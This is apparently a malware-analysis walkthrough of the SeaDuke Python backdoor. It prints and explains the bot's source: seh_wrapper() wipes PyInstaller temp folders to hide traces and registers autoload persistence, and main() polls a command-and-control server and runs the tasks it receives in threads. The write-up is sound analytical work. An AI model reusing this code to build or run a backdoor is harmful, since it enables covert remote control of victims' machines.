# 2) seh_wrapper
## doing seh_wrapper()
```python
def seh_wrapper():
    if botKlass.frozen:
        # _MEIPASS is the partial foldername where Python libraries are stored.
        # Cleaning up these directories to remove any remnants.
        attr__MEIPASS=getattr(sys,'_MEIPASS', None)
        botKlass.add_cleanup_dir(attr__MEIPASS)
        botKlass.do_cleanup_dirs()
    if botKlass.enable_autoload and not botKlass.autoload_registered:
        botActionKlass=BotSelfActionsKlass()
        botActionKlass.register()
    try:
        main()
    except KeyboardInterrupt as ki:
        sys_exit(0)
```
### first, it cleans up after itself
seaduke finds the temporary folder used by pysinstaller.
```python
attr__MEIPASS=getattr(sys,'_MEIPASS', None)  # https://stackoverflow.com/questions/22472124/what-is-sys-meipass-in-python
```
it then cleans up after itself with:
```python
def seh_wrapper():
    if botKlass.frozen:
        ...
        botKlass.add_cleanup_dir(attr__MEIPASS)
        botKlass.do_cleanup_dirs()
```
finally, it calls `main()`.

## main()
```python
def main():
    threadStuffKlass=DoingThreadStuffKlass()
    networkHandleKlass=NetworkHandlerKlass()
    while 1:
        gc_collect() # Garbage collector
        pass
        networkTasks=networkHandleKlass.get_tasks()
        pass
        if networkTasks:
            for networkTask in networkTasks:
                taskID=networkTask.get('task_id',None)
                taskData=networkTask.get('task_data',None)
                if taskID and taskData:
                    if not threadStuffKlass.have_task(taskID):
                        try:
                            threadStuffKlass.put(taskID,taskData)
                            botKlass.reset_tick_count()
                        except KeyboardInterrupt as ki:
                            time_sleep(5)
                            sys_exit(0)
                        except Exception as e:
                            pass
            time_sleep(random_randint(3,7))
        else:
            time_sleep(random_randint(*botKlass.update_interval))
            botKlass.tick_count+=1
```
### instantiate threads and network handler
we instantiate a `DoingThreadStuffKlass` object and a `NetworkHandlerKlass` object.
```python
def main():
    threadStuffKlass=DoingThreadStuffKlass()


class DoingThreadStuffKlass(object):
    def __init__(self):
        self.threads={}


class NetworkHandlerKlass(object):
    def __init__(self,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
        self.__url=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('url',None)
        self.user_agent=botKlass.user_agent
```